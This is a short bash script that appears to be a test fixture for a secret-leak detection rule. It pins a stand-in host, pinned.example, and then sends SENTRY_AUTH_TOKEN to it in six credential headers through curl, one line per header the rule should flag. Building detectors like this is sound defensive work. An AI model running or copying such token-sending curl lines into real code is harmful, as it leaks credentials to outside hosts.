#!/usr/bin/env bash
set -uo pipefail

case "$-" in
  *x*)
    if [ -n "${SENTRY_AUTH_TOKEN:+x}" ]; then
      printf "[FATAL] refusing to trace with SENTRY_AUTH_TOKEN set (#7797)\n" >&2
      exit 78
    fi
    ;;
esac

# Rules A/B/C/D are clean; Rule E must fire SIX times, one site per ALTERNATE of the
# credential-header constant (authorization, cf-access-client-id, cf-access-client-secret,
# x-signature-256, x-soleur-kb-drift-signature, x-api-key). The suite deletes one alternate at a
# time and expects exactly five messages from each mutant.
readonly SINK_URL_PINNED="https://pinned.example/ingest"
SINK_URL="${FIXTURE_SINK_URL:-$SINK_URL_PINNED}"
if [ "$SINK_URL" != "https://pinned.example/ingest" ]; then
  printf 'refusing an unpinned destination\n' >&2
  exit 2
fi

curl --disable --noproxy '*' -sS -H "Authorization: Basic ${SENTRY_AUTH_TOKEN}" "$SINK_URL" || true
curl --disable --noproxy '*' -sS -H "CF-Access-Client-Id: ${SENTRY_AUTH_TOKEN}" "$SINK_URL" || true
curl --disable --noproxy '*' -sS -H "CF-Access-Client-Secret: ${SENTRY_AUTH_TOKEN}" "$SINK_URL" || true
curl --disable --noproxy '*' -sS -H "X-Signature-256: sha256=${SENTRY_AUTH_TOKEN}" "$SINK_URL" || true
curl --disable --noproxy '*' -sS -H "X-Soleur-Kb-Drift-Signature: sha256=${SENTRY_AUTH_TOKEN}" "$SINK_URL" || true
curl --disable --noproxy '*' -sS -H "X-API-Key: ${SENTRY_AUTH_TOKEN}" "$SINK_URL" || true
